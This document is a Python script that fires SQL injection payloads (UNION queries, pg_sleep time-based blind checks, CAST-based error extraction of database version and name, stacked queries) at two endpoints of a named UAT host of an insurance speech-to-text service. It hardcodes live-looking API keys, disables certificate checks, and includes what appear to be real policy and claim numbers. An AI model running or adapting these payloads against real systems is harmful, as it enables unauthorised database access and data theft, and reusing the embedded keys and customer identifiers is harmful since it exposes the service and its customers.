"""
SQL Injection Confirmation Tests
Goal: Determine if the SQLi is truly exploitable or just error-based information disclosure
"""
import requests
import json
import time
import urllib3
urllib3.disable_warnings()

BASE = "https://uat-ai-speechtotextwrapper.godigit.com"
H = {"X-Api-Key": "moz0CdYp1F", "Content-Type": "application/json", "Accept": "application/json"}

def make_llm_payload(request_id, app_txn_id="202400803717", idp_dms_id="CBA37AECD4464EA1B2615D7BF6DE2778", idp_doc_id="019c6a38-3418-71d4-9ba6-7b5f93bf5cc7"):
    return {
        "data": {
            "getLlmResult": [{
                "requestId": request_id,
                "appTxnId": app_txn_id,
                "companyCode": "GI",
                "results": [{
                    "idpDmsId": idp_dms_id,
                    "idpDocId": idp_doc_id,
                    "llmResult": {
                        "processSource": "GeminiLlm",
                        "outputPrompt": {
                            "answer": [{
                                "part": "head_lamp",
                                "pose": None,
                                "action": "REPLACE",
                                "thought_process": "test",
                                "conversation_snippet": "test"
                            }]
                        }
                    }
                }]
            }]
        }
    }

print("=" * 70)
print("TEST 1: VALID UUID vs INVALID UUID — Behavior Diff")
print("=" * 70)
print("If a valid UUID gives a DIFFERENT response than an invalid one,")
print("it means the query actually executes for valid UUIDs.\n")

valid_uuid = "019c6a38-33f4-79cf-8608-cc250e59a8dc"
fake_uuid  = "00000000-0000-0000-0000-000000000001"
invalid    = "not-a-uuid"

for label, rid in [("Original valid UUID", valid_uuid), ("Fake valid UUID", fake_uuid), ("Invalid non-UUID", invalid)]:
    r = requests.post(f"{BASE}/llmCallback", json=make_llm_payload(rid), headers=H, verify=False, timeout=15)
    print(f"  [{label}]")
    print(f"    requestId: {rid}")
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text[:300]}")
    print()

print("=" * 70)
print("TEST 2: TYPE CASTING BYPASS ATTEMPTS")
print("=" * 70)
print("Try to inject SQL WITHIN valid UUID format or via type casting\n")

casting_bypasses = [
    ("UUID with trailing SQL", "019c6a38-33f4-79cf-8608-cc250e59a8dc'::text; SELECT 1--"),
    ("UUID cast bypass", "019c6a38-33f4-79cf-8608-cc250e59a8dc'::varchar"),
    ("Double UUID concat", "019c6a38-33f4-79cf-8608-cc250e59a8dc' || '"),
    ("Hex encoded quote", "019c6a38-33f4-79cf-8608-cc250e59a8dc\\x27"),
    ("Unicode quote", "019c6a38-33f4-79cf-8608-cc250e59a8dc\u0027"),
    ("Dollar quoting", "019c6a38-33f4-79cf-8608-cc250e59a8dc$$;SELECT 1;$$"),
]

for name, payload in casting_bypasses:
    r = requests.post(f"{BASE}/llmCallback", json=make_llm_payload(payload), headers=H, verify=False, timeout=15)
    print(f"  [{name}]")
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text[:300]}")
    print()

print("=" * 70)
print("TEST 3: TIME-BASED BLIND — DOES THE QUERY ACTUALLY EXECUTE?")
print("=" * 70)
print("Compare response time for valid UUID with/without pg_sleep\n")

# First: baseline timing with valid UUID
times_baseline = []
for i in range(3):
    start = time.time()
    r = requests.post(f"{BASE}/llmCallback", json=make_llm_payload(valid_uuid), headers=H, verify=False, timeout=30)
    elapsed = time.time() - start
    times_baseline.append(elapsed)
    print(f"  Baseline #{i+1}: {elapsed:.2f}s (status {r.status_code})")

avg_baseline = sum(times_baseline) / len(times_baseline)
print(f"  Average baseline: {avg_baseline:.2f}s\n")

# Now try time-based with a valid UUID prefix + injection
# The key insight: if the query runs BEFORE type casting, pg_sleep would delay
time_payloads = [
    ("pg_sleep in WHERE (invalid UUID)", "' OR pg_sleep(5)::text='1"),
    ("Subquery sleep (invalid UUID)", "' UNION SELECT pg_sleep(5)--"),
    # These are structurally valid UUIDs but with sleep in secondary clause
    ("Sleep after valid UUID AND", f"{valid_uuid}' AND pg_sleep(5) IS NOT NULL--"),
    ("Sleep via stacked query", f"{valid_uuid}'; SELECT pg_sleep(5);--"),
]

for name, payload in time_payloads:
    start = time.time()
    r = requests.post(f"{BASE}/llmCallback", json=make_llm_payload(payload), headers=H, verify=False, timeout=30)
    elapsed = time.time() - start
    delayed = elapsed > (avg_baseline + 4)
    marker = "⏱️ DELAYED!" if delayed else "No delay"
    print(f"  [{name}]")
    print(f"    Time: {elapsed:.2f}s ({marker})")
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text[:200]}")
    print()

print("=" * 70)
print("TEST 4: SECOND-ORDER SQLi — OTHER FIELDS THAT MIGHT NOT BE UUID")
print("=" * 70)
print("Check if appTxnId, companyCode, idpDmsId, idpDocId hit SQL differently\n")

# appTxnId is a string like "202400803717" — likely VARCHAR, not UUID!
sqli_tests = [
    ("appTxnId - basic", "appTxnId", "' OR '1'='1"),
    ("appTxnId - time blind 5s", "appTxnId", "202400803717' AND (SELECT pg_sleep(5))='1"),
    ("appTxnId - error extract", "appTxnId", "' AND 1=CAST((SELECT version()) AS int)--"),
    ("appTxnId - UNION version", "appTxnId", "' UNION SELECT version()--"),
    ("companyCode - basic", "companyCode", "' OR '1'='1"),
    ("companyCode - error extract", "companyCode", "' AND 1=CAST((SELECT current_database()) AS int)--"),
    ("idpDmsId - basic", "idpDmsId", "' OR '1'='1"),
    ("idpDmsId - error extract", "idpDmsId", "' AND 1=CAST((SELECT version()) AS int)--"),
    ("idpDocId - basic", "idpDocId", "' OR '1'='1"),
    ("idpDocId - error extract", "idpDocId", "' AND 1=CAST((SELECT version()) AS int)--"),
    ("part - basic", "part", "' OR '1'='1"),
    ("part - error extract", "part", "' AND 1=CAST((SELECT version()) AS int)--"),
    ("action - basic", "action", "' OR '1'='1"),
    ("action - error extract", "action", "' AND 1=CAST((SELECT version()) AS int)--"),
    ("thought_process - SQLi", "thought_process", "' AND 1=CAST((SELECT version()) AS int)--"),
    ("conversation_snippet - SQLi", "conversation_snippet", "' AND 1=CAST((SELECT version()) AS int)--"),
]

for name, field, sqli_val in sqli_tests:
    payload = make_llm_payload(valid_uuid)
    
    if field == "appTxnId":
        payload["data"]["getLlmResult"][0]["appTxnId"] = sqli_val
    elif field == "companyCode":
        payload["data"]["getLlmResult"][0]["companyCode"] = sqli_val
    elif field == "idpDmsId":
        payload["data"]["getLlmResult"][0]["results"][0]["idpDmsId"] = sqli_val
    elif field == "idpDocId":
        payload["data"]["getLlmResult"][0]["results"][0]["idpDocId"] = sqli_val
    elif field in ["part", "action", "thought_process", "conversation_snippet"]:
        payload["data"]["getLlmResult"][0]["results"][0]["llmResult"]["outputPrompt"]["answer"][0][field] = sqli_val
    
    start = time.time()
    r = requests.post(f"{BASE}/llmCallback", json=payload, headers=H, verify=False, timeout=20)
    elapsed = time.time() - start
    
    # Check for SQL error indicators
    resp = r.text.lower() if r.text else ""
    sql_indicators = [kw for kw in ["syntax", "line 1:", "pg_", "postgresql", "column", "relation", "cast", "integer"] if kw in resp]
    
    marker = "🔴 SQL ERROR!" if sql_indicators else ""
    delayed = "⏱️ DELAYED!" if elapsed > (avg_baseline + 4) else ""
    
    print(f"  [{name}]")
    print(f"    Status: {r.status_code} | Time: {elapsed:.2f}s {delayed}")
    if sql_indicators:
        print(f"    {marker} Indicators: {sql_indicators}")
    print(f"    Response: {r.text[:300]}")
    print()

print("=" * 70)
print("TEST 5: audioChunkAnalysis — SQLi IN ALL STRING FIELDS")
print("=" * 70)

AUDIO_PAYLOAD = {
    "bitrate": 108801.76,
    "speaker": "AjayRawat(W)",
    "channels": 1,
    "duration": 5.94,
    "policy_no": "D300817696",
    "request_id": "2",
    "session_id": "1",
    "sample_rate": 44100,
    "claim_number": "202500007934",
    "to_timestamp": "12-06-2025_19:06:45",
    "from_timestamp": "12-06-2025_19:06:40",
    "vehicle_number": "1112610707",
    "manufacture_year": "2016",
    "encode_conversion_datatype": "Float32Array",
    "base64": "data:audio/wav;base64,UklGRiRxAgBXQVZFZm10IBAAAAABAAEAgD4AAAB9AAACABAAZGF0YQBxAgAAAA=="
}

H2 = {"X-Api-Key": "dmeet123", "Content-Type": "application/json", "Accept": "application/json"}

audio_sqli_fields = [
    "speaker", "policy_no", "request_id", "session_id", 
    "claim_number", "vehicle_number", "manufacture_year",
    "to_timestamp", "from_timestamp", "encode_conversion_datatype"
]

for field in audio_sqli_fields:
    import copy
    test_payload = copy.deepcopy(AUDIO_PAYLOAD)
    test_payload[field] = "' AND 1=CAST((SELECT version()) AS int)--"
    
    start = time.time()
    r = requests.post(f"{BASE}/audioChunkAnalysis", json=test_payload, headers=H2, verify=False, timeout=15)
    elapsed = time.time() - start
    
    resp = r.text.lower() if r.text else ""
    sql_indicators = [kw for kw in ["syntax", "line 1:", "pg_", "postgresql", "column", "relation", "cast", "integer", "version"] if kw in resp]
    
    marker = "🔴 SQL ERROR!" if sql_indicators else ""
    
    print(f"  [{field}] Status: {r.status_code} | {elapsed:.2f}s {marker}")
    if sql_indicators:
        print(f"    SQL Indicators: {sql_indicators}")
        print(f"    Response: {r.text[:400]}")
    else:
        print(f"    Response: {r.text[:150]}")
    print()

print("=" * 70)
print("CONCLUSION")
print("=" * 70)
